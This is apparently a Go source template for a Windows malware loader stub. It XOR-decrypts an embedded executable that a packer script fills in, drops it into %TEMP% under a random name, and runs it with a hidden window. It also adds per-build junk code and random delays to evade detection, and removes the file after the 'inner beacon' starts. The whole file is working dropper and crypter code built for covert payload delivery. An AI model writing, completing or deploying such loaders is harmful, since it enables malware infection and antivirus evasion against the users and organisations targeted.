//go:build windows
// +build windows

// {{RANDOM_HEADER}}
// {{RANDOM_BUILD_ID}}

package main

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"
)

// ============================================================
// EMBEDDED PAYLOAD — filled by packer.py at build time
// ============================================================
var encPayload = []byte{ {{PAYLOAD_BYTES}} }
var xorKey     = []byte{ {{KEY_BYTES}} }
var buildSeed  = "{{BUILD_SEED}}"

// ============================================================
// LOGGER (same pattern as beacon.go — log to %TEMP%)
// ============================================================
var logWriter io.Writer

func initLog() {
	logPath := filepath.Join(os.TempDir(),
		fmt.Sprintf("ps_stub_%s.log", time.Now().Format("20060102_150405")))
	f, err := os.OpenFile(logPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		return
	}
	logWriter = f
	logf("[STUB] Log started — PID=%d", os.Getpid())
	logf("[STUB] Payload size: %d bytes, key size: %d bytes", len(encPayload), len(xorKey))
}

func logf(format string, args ...any) {
	msg := fmt.Sprintf("[%s] %s\n",
		time.Now().Format("15:04:05.000"),
		fmt.Sprintf(format, args...))
	if logWriter != nil {
		logWriter.Write([]byte(msg))
	}
}

// ============================================================
// RANDOM JUNK — unique dead code per build
// ============================================================
type {{JUNK_TYPE_1}} struct {
	id  uint64
	buf [{{JUNK_SIZE}}]byte
	tag string
}

type {{JUNK_TYPE_2}} struct {
	items []{{JUNK_TYPE_1}}
	hash  [32]byte
}

var _{{JUNK_VAR_1}} = func() uint32 {
	v := uint32({{JUNK_SEED}})
	for i := 0; i < {{JUNK_LOOP}}; i++ {
		v ^= v << 13; v ^= v >> 17; v ^= v << 5
	}
	return v
}()

var _{{JUNK_VAR_2}} = func() string {
	h := sha256.Sum256([]byte(buildSeed + hex.EncodeToString(xorKey)))
	return hex.EncodeToString(h[:{{JUNK_HASH}}])
}()

func {{JUNK_FUNC_1}}(b []byte) uint32 {
	var h uint32 = 0x{{JUNK_XOR}}
	for _, c := range b { h = h*31 + uint32(c) }
	return h
}

func {{JUNK_FUNC_2}}() {
	t := {{JUNK_TYPE_1}}{id: uint64(_{{JUNK_VAR_1}})}
	copy(t.buf[:], xorKey)
	_ = {{JUNK_FUNC_1}}(t.buf[:])
}

// ============================================================
// ENTRY POINT
// ============================================================
func main() {
	initLog()
	defer func() {
		if r := recover(); r != nil {
			logf("[STUB] PANIC: %v", r)
		}
		logf("[STUB] Exit")
	}()

	// Phase 1: Short random delay
	delay := {{DELAY_MIN}} + rand.Intn({{DELAY_RANGE}})
	logf("[STUB] Sleep %d seconds before unpack", delay)
	time.Sleep(time.Duration(delay) * time.Second)

	// Phase 2: XOR decrypt
	logf("[STUB] Decrypting payload...")
	payload := make([]byte, len(encPayload))
	for i := range encPayload {
		payload[i] = encPayload[i] ^ xorKey[i%len(xorKey)]
	}
	logf("[STUB] Decrypted %d bytes", len(payload))

	// Verify: first 2 bytes of a PE should be "MZ" (0x4D 0x5A)
	if len(payload) < 2 || payload[0] != 0x4D || payload[1] != 0x5A {
		logf("[STUB] ERROR: decrypted data is NOT a valid PE (no MZ header). First bytes: %02X %02X",
			payload[0], payload[1])
		return
	}
	logf("[STUB] PE header OK (MZ)")

	// Phase 3: Write to %TEMP%
	tmpDir := os.TempDir()
	exeName := randomName() + ".exe"
	exePath := filepath.Join(tmpDir, exeName)
	logf("[STUB] Writing to: %s", exePath)

	err := os.WriteFile(exePath, payload, 0644)
	if err != nil {
		logf("[STUB] ERROR writing file: %v", err)
		return
	}
	logf("[STUB] File written OK (%d bytes)", len(payload))

	// Phase 4: Execute
	logf("[STUB] Executing: %s", exePath)
	cmd := exec.Command(exePath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err = cmd.Start()
	if err != nil {
		logf("[STUB] ERROR CreateProcess: %v", err)
		os.Remove(exePath)
		return
	}
	logf("[STUB] Process started — PID=%d", cmd.Process.Pid)

	// DON'T delete immediately — inner beacon has its own sleep phase.
	// Wait for the beacon to fully start, then clean up.
	time.Sleep(60 * time.Second)
	os.Remove(exePath)
	logf("[STUB] Cleanup done — exiting")
}

// ============================================================
// HELPERS
// ============================================================
func randomName() string {
	const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, {{NAME_LEN}})
	for i := range b { b[i] = chars[rand.Intn(len(chars))] }
	return string(b)
}

var _ = unsafe.Sizeof(0)
